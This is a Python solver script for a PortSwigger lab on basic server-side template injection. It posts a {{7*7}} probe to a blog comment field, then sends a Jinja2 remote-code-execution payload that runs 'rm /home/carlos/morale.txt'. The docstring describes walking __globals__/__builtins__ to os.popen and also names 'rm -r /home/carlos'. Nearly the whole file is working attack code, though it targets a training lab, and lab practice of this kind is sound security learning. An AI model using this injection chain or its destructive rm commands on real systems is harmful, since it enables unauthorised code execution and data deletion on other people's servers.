"""
Lab 1: Basic server-side template injection
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic
Difficulty: Practitioner

📝 Plain-text context, Jinja2. Confirm with {{7*7}}, then walk the
__globals__/__builtins__ chain to os.popen for RCE.

Goal: execute `rm -r /home/carlos` via the vulnerable "comment" field... or
per this specific lab, delete morale.txt from the user's home directory.
"""

from utils import get_session, log, note, format_rce, JINJA2_RCE

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
COMMENT_PATH = "/post/comment"  # confirm exact vulnerable field/path


def inject(session, payload, post_id="1"):
    r = session.post(f"{TARGET}{COMMENT_PATH}",
                      data={"postId": post_id, "name": "x", "email": "x@x.com",
                            "website": "http://x.com", "comment": payload})
    return r.text


def run():
    s = get_session()

    note("Confirming injection with a basic math probe.")
    text = inject(s, "{{7*7}}")
    if "49" in text:
        log("Confirmed: {{7*7}} evaluated to 49 — Jinja2-style injection.")
    else:
        log("Probe didn't evaluate — check the real injection point/context.", ok=False)
        return

    payload = format_rce(JINJA2_RCE, "rm /home/carlos/morale.txt")
    note(f"RCE payload: {payload}")
    text = inject(s, payload)
    log("Payload sent — check the resulting page/comment for command output or errors.")
    print(text[-500:])


if __name__ == "__main__":
    run()
